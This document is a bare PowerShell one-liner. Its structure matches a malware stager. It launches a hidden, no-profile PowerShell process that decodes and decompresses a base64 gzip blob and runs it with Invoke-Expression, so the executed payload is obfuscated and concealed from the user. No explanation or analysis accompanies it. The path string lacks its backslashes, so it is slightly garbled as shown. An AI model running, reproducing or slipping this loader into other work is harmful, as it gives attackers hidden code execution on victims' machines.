if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'syswow64WindowsPowerShellv1.0powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALvNCVgCA7VWf2/aPBD+u5P2HaIJiUSjhF9ru0qTXoeQQiEtNBAKDE1u4gSDE7PEocC27/5egKxU66a+k96oFXbuznd+7rm7eEnoCMpDyQu2yzNzKH17++akiyMcSHKON/3qF7cg5dbJ3KjiTaycnIA4N++PDE/6JMkTtFzqPMA0nF5e1pMoIqHY74tXRKA4JsEDoySWFem7NJyRiJzePsyJI6RvUu5L8YrxB8wOaps6dmZEOkWhm8o63MFpYEVryaiQ858/55XJaXlabHxNMIvlvLWJBQmKLmN5RfqhpA77myWR8yZ1Ih5zTxSHNKxWioMwxh65gdNWxCRixt04r8A14C8iIolCaX+h9IS9XM7DshtxB7luRGJQL7bCFV8QORcmjBWkf+TJwf1dEgoaEJALEvGlRaIVdUhcbOLQZeSOeFP5hjxmt36tkXxsBFpdESkFSMhLcZrcTRjZm+aVXyM9ZFGB5ziTgMCPt2/evvEyAoRidn7nG5X+MQVgdTLZrQmEKnd5THfKn6RSQTLBJxY82sA2148SokylSZqDyXQq5eKg8qFc+P0B5UwbdGeOveBni023rddANLE5dadgekhTLnxoaBdnO9HvGacTj4ZE34Q4oE5GKvkl+InHyO7SxUztBuKT8wcBcXXCiI9FimdBmvxq1gio+GmrJZS5JEIOpDCGqCC7yvNg9imS863QJAHgtd/nIR0eUJlk2gf6bjLv6R6U8nWG47ggdROoJacgWQQzAlWJwpgeRCgRfLfMP4VrJkxQB8ciO26qHEF5cFnnYSyixIEswvX71pI4FLMUjYLUpC7RNhb1M9f5F7GoY8Zo6MNJK8gFvEkxsETKjSjtHTseKEWLiFawZCQApV1hGwz7UMaHWtixCfvEzb8QZcb2PbVTSDIsjmKEPFuMi4Jk00hAi0jhPebVX4Zy1CWyoOoROWRHzqpoom1ESvscGSy+uClPD0DtYIkEQGJEPNBwTM5qlogAMPmdekvrCJ5RK2Smoy1oGT3ScsuE/wGttrh+7rav50010tczD7Xiltns6r1ms7a6tuyasBot0e62hNm4n88t1LwbjMS4hZp9WlqMatvlNd1aHeSO1urZVts+lrT1du673kj3PP/cs+7KHwzaGdZ7WqmCO3oj6Qy1R61Uixv0sdmjg97i2hAPI5vhgaf69+WPmK470dwuc3PbQuhqVnW21559NTPdzaipfhzWFqiBUD1s2IbG2yMtQl3Vxr7NH9u+hgO/jjTHpGTcGxhar2doaHA1/6p/VH2wvcczbWhX6Hh5fzeDvQEhtNVSreWSLR/1AKQrjrB/Bzp+veLMPNDR3yPt/Q2PK3ihcaSBjjH+CnGNlkaXgbw/qHBks5t7jDrjjaGq5VG3hpolOrzyUXok9rUeRvFK3+pq2Xa5O/xwM/JU+56dq3q9v3Q8VVUfm3rbGZfXF7fnF50htQOOBqpqv0u5AeTIra7rTWsUxPNqu32U99+1eBNH8Qwz4AO07qwyDR4Zhzbc5TS1kOVsHi9IFBIGYwwGXUZtxBh30oHw1LNhIu3nxBSKdADLauXFlSL9VFSehkX26vJyDNFCpexoXOyQ0BezQmldLZWg35fWtRJc+/VXrPPlRt6fVUgHxjOwfnphOy9KWka5xW27c726GI6H/zuWhyqewY/7Kiyf3v1B+ip8S4XnSPwifv7iP2H+N1AMMRWgbEFXYmQ/K/+AyIFIR58aT1kDrniHJ/3ku03E6Q18h/wLKT6J7mYKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);